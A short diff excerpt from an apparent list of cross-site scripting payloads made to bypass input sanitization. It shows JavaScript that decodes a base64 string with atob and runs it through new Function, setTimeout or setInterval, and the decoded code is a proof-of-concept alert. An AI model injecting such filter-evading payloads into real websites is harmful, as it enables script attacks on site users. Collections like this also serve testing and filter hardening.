@@ -12,6 +12,8 @@ A list of payloads that I generated in order to bypass some sanitizations and re
 const base64Code = "YWxlcnQoIlNhbWkgTWlyb3YiKQ=="; const decodedCode = atob(base64Code); const executeCode = new Function(decodedCode); setTimeout(executeCode, 2000);
 
 2. SetInterval with atob and base64 payload.
+
+
 setInterval(atob("YWxlcnQoIlNhbWkgTWlyb3YiKQ=="),2000);
 
 Obfuscated version:
